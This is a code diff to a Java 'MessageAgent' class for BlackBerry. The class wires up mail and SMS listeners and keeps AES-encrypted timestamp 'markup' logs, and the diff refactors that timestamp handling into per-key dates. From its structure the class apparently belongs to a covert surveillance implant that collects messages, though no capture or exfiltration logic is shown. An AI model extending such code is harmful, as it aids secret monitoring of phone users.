@@ -11,6 +11,7 @@ package blackberry.agent;
 
 import java.io.IOException;
 import java.util.Date;
+import java.util.Hashtable;
 import java.util.Vector;
 
 import net.rim.device.api.util.IntHashtable;
@@ -19,6 +20,7 @@ import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Keys;
+import blackberry.log.TimestampMarkup;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.log.Markup;
@@ -59,7 +61,6 @@ public final class MessageAgent extends Agent {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
-
     //#endif
 
     protected static final int SLEEPTIME = 5000;
@@ -67,9 +68,10 @@ public final class MessageAgent extends Agent {
     MailListener mailListener;
     SmsListener smsListener;
 
-    Markup markupDate;
+    TimestampMarkup markupDate;
+    //Hashtable markupHashtable;
 
-    public long lastcheck = 0;
+    //public long lastcheck = 0;
 
     protected String identification;
     public IntHashtable filtersSMS = new IntHashtable();
@@ -108,7 +110,7 @@ public final class MessageAgent extends Agent {
         parse(confParams);
 
         // mantiene la data prima di controllare tutte le email
-        markupDate = new Markup(agentId, Keys.getInstance().getAesKey());
+        markupDate = new TimestampMarkup(agentId, Keys.getInstance().getAesKey());
 
         setDelay(SLEEPTIME);
         setPeriod(NEVER);
@@ -156,7 +158,7 @@ public final class MessageAgent extends Agent {
 
         //#ifdef DBC
         Check.requires(content != null, "createLog content null");
-        Check.requires(log!=null, "log null");
+        Check.requires(log != null, "log null");
         //#endif
 
         synchronized (log) {
@@ -170,38 +172,36 @@ public final class MessageAgent extends Agent {
         //#endif
     }
 
-    /**
+    /*    *//**
      * Inits the markup.
      * 
      * @return the long
      */
-    public long initMarkup() {
-
-        if (markupDate.isMarkup() == false) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("Markup doesn't exists, timestamp = 0 ");
-            //#endif
-            final Date date = new Date();
-            lastcheck = 0;
-
-        } else {
-            byte[] deserialized;
-            //#ifdef DEBUG_TRACE
-            debug.trace("Reading markup");
-            //#endif
-            try {
-                deserialized = markupDate.readMarkup();
-                lastcheck = Utils.byteArrayToLong(deserialized, 0);
-
-            } catch (final IOException e) {
-                //#ifdef DEBUG_ERROR
-                debug.error("Cannot read markup: " + e);
-                //#endif
-            }
-
-        }
-        return lastcheck;
-    }
+    /*
+     * public long initMarkup() {
+     * if (markupDate.isMarkup() == false) {
+     * //#ifdef DEBUG_TRACE
+     * debug.trace("Markup doesn't exists, timestamp = 0 ");
+     * //#endif
+     * final Date date = new Date();
+     * lastcheck = 0;
+     * } else {
+     * byte[] deserialized;
+     * //#ifdef DEBUG_TRACE
+     * debug.trace("Reading markup");
+     * //#endif
+     * try {
+     * deserialized = markupDate.readMarkup();
+     * lastcheck = Utils.byteArrayToLong(deserialized, 0);
+     * } catch (final IOException e) {
+     * //#ifdef DEBUG_ERROR
+     * debug.error("Cannot read markup: " + e);
+     * //#endif
+     * }
+     * }
+     * return lastcheck;
+     * }
+     */
 
     /*
      * (non-Javadoc)
@@ -307,13 +307,24 @@ public final class MessageAgent extends Agent {
     /**
      * Update markup.
      */
-    public void updateMarkup() {
+    public void updateLastCheck(String key) {
         //#ifdef DEBUG_TRACE
-        debug.trace("Sto scrivendo nel markup");
+        debug.trace("Writing date in markup: " + key);
         //#endif
         final Date date = new Date();
-        lastcheck = date.getTime();
-        final byte[] serialize = Utils.longToByteArray(lastcheck);
-        markupDate.writeMarkup(serialize);
+
+        markupDate.put(key, date);
+    }
+
+    public long getLastCheck(String key) {
+        Date date = markupDate.get(key);
+        //#ifdef DEBUG_TRACE
+        debug.trace("getLastCheck: " + key + " = " + date);
+        //#endif
+        long timestamp = 0;
+        if (date != null) {
+            timestamp = date.getTime();
+        }
+        return timestamp;
     }
 }
